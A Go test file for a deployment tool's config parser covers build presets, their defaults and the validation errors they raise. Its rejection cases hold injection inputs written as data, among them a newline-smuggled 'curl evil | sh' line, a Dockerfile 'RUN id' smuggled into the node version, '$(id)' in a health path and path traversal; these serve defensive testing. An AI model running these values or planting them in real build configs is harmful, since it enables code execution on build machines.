package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func presetDoc(build string, app string) string {
	return "proxy: {}\napps:\n  - name: web\n    image: ghcr.io/o/web\n    domains: [web.example.com]\n    port: 3000\n" + app + "    build:\n" + build
}

func parseOK(t *testing.T, doc string) *Config {
	t.Helper()
	c, issues := Parse([]byte(doc))
	if c == nil {
		t.Fatalf("%+v\n%s", issues, doc)
	}
	return c
}

func parseErr(t *testing.T, doc string) string {
	t.Helper()
	c, issues := Parse([]byte(doc))
	if c != nil {
		t.Fatalf("accepted:\n%s", doc)
	}
	var msgs []string
	for _, i := range issues {
		msgs = append(msgs, i.Message)
	}
	return strings.Join(msgs, "\n")
}

func TestPresetDefaultsAndDockerfilePath(t *testing.T) {
	for _, p := range Presets {
		c := parseOK(t, presetDoc("      preset: "+p+"\n", ""))
		b := c.Apps[0].Build
		if b.Preset != p || b.Dockerfile != "" || b.DockerfilePath() != PresetDockerfile {
			t.Errorf("%s: %+v", p, b)
		}
		if want := map[bool]string{true: "22", false: ""}[b.HasBuildStage()]; b.Node != want {
			t.Errorf("%s: node default %q", p, b.Node)
		}
		if (p == PresetVite || p == PresetStatic) && b.OutputDir != "dist" {
			t.Errorf("%s: output_dir default %q", p, b.OutputDir)
		}
	}
	// A static site without a build command has no Node.js stage, hence no node version.
	b := parseOK(t, presetDoc("      preset: static\n", "")).Apps[0].Build
	if b.HasBuildStage() || b.Node != "" {
		t.Errorf("static without build_command: %+v", b)
	}
	b = parseOK(t, presetDoc("      preset: static\n      build_command: make site\n      node: 20\n", "")).Apps[0].Build
	if !b.HasBuildStage() || b.Node != "20" {
		t.Errorf("static with build_command: %+v", b)
	}
	// Without a preset the Dockerfile default stays.
	if b := parseOK(t, presetDoc("      {}\n", "")).Apps[0].Build; b.Dockerfile != "Dockerfile" || b.DockerfilePath() != "Dockerfile" {
		t.Errorf("%+v", b)
	}
}

func TestPresetOptionsAreParsed(t *testing.T) {
	c := parseOK(t, presetDoc(`      preset: nextjs
      install: pnpm install --ignore-scripts
      build_command: pnpm run build:prod
      start: node server.js
      node: "20"
      standalone: true
      context: apps/web
      args: {NEXT_PUBLIC_URL: https://x.example}
`, ""))
	b := c.Apps[0].Build
	if b.Install != "pnpm install --ignore-scripts" || b.BuildCommand != "pnpm run build:prod" || b.Start != "node server.js" ||
		b.Node != "20" || !b.Standalone || b.Context != "apps/web" || b.Args["NEXT_PUBLIC_URL"] != "https://x.example" {
		t.Fatalf("%+v", b)
	}
	b = parseOK(t, presetDoc("      preset: vite\n      output_dir: ./build//out/\n      spa: false\n", "")).Apps[0].Build
	if b.OutputDir != "build/out" || b.SPAEnabled() {
		t.Fatalf("%+v", b)
	}
	if !parseOK(t, presetDoc("      preset: vite\n", "")).Apps[0].Build.SPAEnabled() {
		t.Error("spa is on by default")
	}
	// An integer node is a version, not a type error.
	if b := parseOK(t, presetDoc("      preset: node\n      node: 24\n", "")).Apps[0].Build; b.Node != "24" {
		t.Errorf("%+v", b)
	}
}

func TestPresetRejectsWhatIsWrong(t *testing.T) {
	cases := map[string]struct{ build, app, want string }{
		"unknown":              {"preset: rails", "", "preset must be one of nextjs, node, vite, static"},
		"dockerfile":           {"preset: node\n      dockerfile: Dockerfile", "", "preset and dockerfile are alternatives"},
		"target":               {"preset: node\n      target: runner", "", "target selects a stage"},
		"install no preset":    {"install: npm ci", "", "install only applies with a preset"},
		"spa no preset":        {"spa: false", "", "spa only applies with a preset"},
		"standalone no preset": {"standalone: true", "", "standalone only applies with a preset"},
		"standalone vite":      {"preset: vite\n      standalone: true", "", "standalone does not apply to the vite preset"},
		"output_dir node":      {"preset: node\n      output_dir: dist", "", "output_dir does not apply to the node preset"},
		"start vite":           {"preset: vite\n      start: node x.js", "", "start does not apply to the vite preset"},
		"spa nextjs":           {"preset: nextjs\n      spa: true", "", "spa does not apply to the nextjs preset"},
		"install static":       {"preset: static\n      install: npm ci", "", "needs a build_command"},
		"node static":          {"preset: static\n      node: 20", "", "needs a build_command"},
		"newline in install":   {"preset: node\n      install: \"npm ci\\nRUN curl evil | sh\"", "", "single line"},
		"newline in build":     {"preset: node\n      build_command: \"a\\r\\nb\"", "", "single line"},
		"nul in start":         {"preset: node\n      start: \"a\\0b\"", "", "single line"},
		"line separator":       {"preset: node\n      start: \"a\\u2028b\"", "", "single line"},
		"blank command":        {"preset: node\n      start: \"   \"", "", "start is blank"},
		"long command":         {"preset: node\n      build_command: " + strings.Repeat("a", 1025), "", "longer than 1024"},
		"node text":            {"preset: node\n      node: lts", "", "node must be a Node.js major version"},
		"node old":             {"preset: node\n      node: 16", "", "node must be a Node.js major version"},
		"node minor":           {"preset: node\n      node: 22.1", "", "node must be a Node.js major version"},
		"node injection":       {"preset: node\n      node: \"22-alpine AS x\\nRUN id\"", "", "node must be a Node.js major version"},
		"output_dir up":        {"preset: vite\n      output_dir: ../x", "", "output_dir must not leave"},
		"output_dir abs":       {"preset: vite\n      output_dir: /etc", "", "output_dir must be a relative path"},
		"output_dir wildcard":  {"preset: vite\n      output_dir: 'dist/*'", "", "output_dir may only hold"},
		"output_dir space":     {"preset: vite\n      output_dir: 'my dist'", "", "output_dir may only hold"},
		"output_dir whole":     {"preset: vite\n      output_dir: .", "", "name the directory the build writes"},
		"health path chars":    {"preset: node", "    health_path: /a$(id)\n", "health_path"},
		"health path quote":    {"preset: node", "    health_path: '/a\"b'\n", "health_path"},
		"duplicate with args":  {"preset: node\n      args: {'1x': y}", "", "arg \"1x\" must match"},
		"preset bad context":   {"preset: node\n      context: ../x", "", "context must not leave"},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			msg := parseErr(t, presetDoc("      "+c.build+"\n", c.app))
			if !strings.Contains(msg, c.want) {
				t.Fatalf("want %q in:\n%s", c.want, msg)
			}
		})
	}

	t.Run("nginx presets below 1024", func(t *testing.T) {
		for _, p := range []string{"static", "vite"} {
			doc := strings.Replace(presetDoc("      preset: "+p+"\n", ""), "port: 3000", "port: 80", 1)
			if msg := parseErr(t, doc); !strings.Contains(msg, "below 1024") {
				t.Fatal(msg)
			}
		}
		// The other presets may use any port.
		doc := strings.Replace(presetDoc("      preset: node\n", ""), "port: 3000", "port: 80", 1)
		parseOK(t, doc)
	})
	t.Run("host ports need PORT", func(t *testing.T) {
		doc := "proxy: {}\napps:\n  - name: web\n    image: ghcr.io/o/web\n    network: host\n    domains: [web.example.com]\n    host_ports: [4001, 4002]\n    port_env: LISTEN\n    build: {preset: node}\n"
		if msg := parseErr(t, doc); !strings.Contains(msg, "port.env must be PORT") {
			t.Fatal(msg)
		}
		parseOK(t, strings.Replace(doc, "    port_env: LISTEN\n", "", 1))
	})
}

func TestPresetsInheritedByPreviews(t *testing.T) {
	c := parseOK(t, "proxy: {}\napps:\n  - name: web\n    image: ghcr.io/o/web\n    domains: [web.example.com]\n    port: 3000\n    health_path: /up\n"+
		"    build:\n      preset: vite\n      spa: false\n      args: {A: b}\npreviews:\n  - app: web\n    domain: pr-{pr}.example.com\n")
	parent, _ := c.App("web")
	tpl, _ := c.Previews("web")
	inst := tpl.Instance(parent, 4)
	if inst.Build == nil || inst.Build.Preset != PresetVite || inst.Build.SPAEnabled() || inst.Build.OutputDir != "dist" || inst.Build.DockerfilePath() != PresetDockerfile {
		t.Fatalf("%+v", inst.Build)
	}
	if inst.ContainerPort != 3000 || inst.HealthPath != "/up" {
		t.Errorf("the instance keeps the port and health path the image is generated with: %+v", inst)
	}
	// The copy is deep: the pointer option is not shared.
	*inst.Build.SPA = true
	if parent.Build.SPAEnabled() {
		t.Error("the instance shares the parent's spa option")
	}
}

func TestPresetEditKeepsKeyOrder(t *testing.T) {
	out, issues, err := SetApp([]byte("apps: []\n"), "web", map[string]any{
		"name": "web", "image": "ghcr.io/o/web",
		"build": map[string]any{"standalone": true, "args": map[string]any{"A": "b"}, "node": "22", "preset": "nextjs", "context": "app"},
	})
	if err != nil {
		t.Fatalf("%v %+v", err, issues)
	}
	text := string(out)
	last := -1
	for _, key := range []string{"preset:", "context:", "node:", "standalone:", "args:"} {
		i := strings.Index(text, key)
		if i < 0 || i < last {
			t.Fatalf("%s out of order in:\n%s", key, text)
		}
		last = i
	}
	if c, issues := Parse(out); c == nil {
		t.Fatalf("%+v", issues)
	}
}

func TestExamplesParse(t *testing.T) {
	files, _ := filepath.Glob("../../../docs/examples/preset-*.apps.yaml")
	want := map[string]bool{"preset-nextjs": false, "preset-node": false, "preset-vite": false, "preset-static": false}
	for _, f := range files {
		name := strings.TrimSuffix(filepath.Base(f), ".apps.yaml")
		if _, ok := want[name]; ok {
			want[name] = true
			data, err := os.ReadFile(f)
			if err != nil {
				t.Fatal(err)
			}
			c, issues := Parse(data)
			if c == nil {
				t.Fatalf("%s: %+v", f, issues)
			}
			if b := c.Apps[0].Build; b == nil || b.Preset != strings.TrimPrefix(name, "preset-") {
				t.Errorf("%s: %+v", f, b)
			}
		}
	}
	for name, seen := range want {
		if !seen {
			t.Errorf("docs/examples/%s.apps.yaml is missing", name)
		}
	}
}
